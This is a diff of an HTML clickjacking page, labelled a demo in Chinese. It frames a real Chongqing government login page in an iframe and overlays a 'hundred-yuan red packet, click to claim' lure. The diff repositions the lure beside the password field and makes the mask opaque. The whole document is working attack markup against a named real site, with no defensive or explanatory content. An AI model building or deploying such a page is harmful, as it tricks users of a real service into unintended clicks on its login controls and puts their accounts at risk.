@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>点击劫持演示（登录页）</title>
+    <title>点击劫持演示（登录页-错位版）</title>
     <style>
         body {
             margin: 0;
@@ -10,7 +10,7 @@
             height: 100vh;
             overflow: hidden;
         }
-        /* 目标页面 完全不透明 */
+        /* 目标登录页 */
         iframe {
             position: absolute;
             top: 0;
@@ -20,52 +20,53 @@
             border: none;
             z-index: 1;
         }
-        /* 前景遮罩+红包 实心展示 */
+        /* 前景实心遮罩 */
         .mask {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            /* 实心白色遮罩，不透明 */
             background: #ffffff;
-            opacity: 0.6;
             z-index: 2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
-        .red-box {
-            width: 210px;
-            height: 290px;
-            background: #e53935;
+        /* 红包按钮：偏右错位 */
+        .red-packet {
+            position: absolute;
+            top: 45%;
+            left: 58%; /* 把红包移到密码框旁边 */
+            transform: translate(-50%, -50%);
+            width: 180px;
+            height: 240px;
+            background: linear-gradient(135deg, #e53935, #ff5252);
             border-radius: 16px;
-            box-shadow: 0 8px 25px #ccc;
+            color: white;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: #fff;
-            z-index: 3;
+            box-shadow: 0 10px 30px rgba(229, 57, 53, 0.4);
             cursor: pointer;
+            z-index: 3;
         }
-        .title {
-            font-size: 26px;
+        .red-packet .title {
+            font-size: 24px;
             font-weight: bold;
+            margin-bottom: 12px;
         }
-        .desc {
-            margin-top: 12px;
-            font-size: 15px;
+        .red-packet .desc {
+            font-size: 14px;
+            opacity: 0.95;
         }
     </style>
 </head>
 <body>
-    <!-- 目标登录页 完整可见 -->
+    <!-- 目标登录页 -->
     <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>
 
-    <!-- 实心诱导层 -->
+    <!-- 实心遮罩+错位红包 -->
     <div class="mask">
-        <div class="red-box">
+        <div class="red-packet">
             <div class="title">百元红包</div>
             <div class="desc">点击立即领取</div>
         </div>
